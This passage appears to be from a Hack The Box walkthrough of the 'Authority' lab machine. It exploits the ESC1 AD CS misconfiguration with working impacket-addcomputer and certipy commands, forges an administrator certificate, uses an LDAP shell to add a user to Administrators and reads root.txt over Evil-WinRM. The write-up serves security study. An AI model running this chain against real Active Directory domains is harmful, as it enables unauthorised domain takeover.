      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
`ESC1`, Great !!. But we need to research a little bit about what it is first.<br>

*ESC1 is a common misconfiguration in Active Directory Certificate Services (AD CS) that lets a low-privileged user obtain a certificate for any identity they choose — including a Domain Admin. It happens when a certificate template allows normal users to enroll, supports client authentication, and has "Enrollee Supplies Subject" enabled (so the requester can set the Subject Alternative Name), with no manager approval required. The result: a regular domain user can request a login certificate as administrator@corp.local, authenticate with it, and instantly gain Domain Admin access — no password cracking needed. Certificates also stay valid for years and survive password resets, making ESC1 a quiet but devastating path to full domain compromise. The fix is configuration, not patching: disable "Supply in the request" on authentication templates and audit every template regularly.*

So we can enroll for the vulnerable certificate template `CorpVPN` but with another upn such as `administrator@authority.htb` for example. From that we achieve a privileged certificate.<br>

But we face with a problem, the certificate template `CorpVPN` doest not allow `svc_ldap` to enroll. It only allows accounts from `AUTHORITY.HTB\Domain Computers`, `AUTHORITY.HTB\Domain Admins` or `AUTHORITY.HTB\Enterprise Admins`. Fortunately, user account in AD is allowed to create computer account which is defaultly member of `Domain Computers` group.

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_12-31.png){: w="700" }

We can achieve our purpose by using `impacket-addcomputer`:
```
└─$ impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -computer-name 'svc$' -computer-pass 'Str0ngP@ssw0rd!2024'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account svc$ with password Str0ngP@ssw0rd!2024.
```
Then we can use `certipy` to enroll the certificate template `CorpVPN` by abuse computer account which has been created above:
```
└─$ certipy req -u 'svc$@authority.htb' -p 'Str0ngP@ssw0rd!2024' -dc-ip 10.129.229.56 -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn administrator@authority.htb -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '10.129.229.56'
[+] DC IP: '10.129.229.56'
[+] DC Host: 'AUTHORITY.HTB'
[+] Target IP: None
[+] Remote Name: 'AUTHORITY.HTB'
[+] Domain: 'AUTHORITY.HTB'
[+] Username: 'SVC$'
[+] Trying to resolve 'AUTHORITY.HTB' at '10.129.229.56'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.229.56[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.229.56[\pipe\cert]
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
So I try to authenticate with `administrator.pfx` certificate:
```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56
```
But unfortunately, it responds this error `KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`. This means at this moment, Domain Controller does not support `PKINIT` which is a extension for Kerberos authentication. So we can authenticate through `LDAP`, I usually abuse that in case NTLM authentication or Kerberos is disabled:
```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
Type help for list of commands

# add_user_to_group svc_ldap Administrators
Adding user: svc_ldap to group Administrators result: OK
```

```
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/14/2026   9:38 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```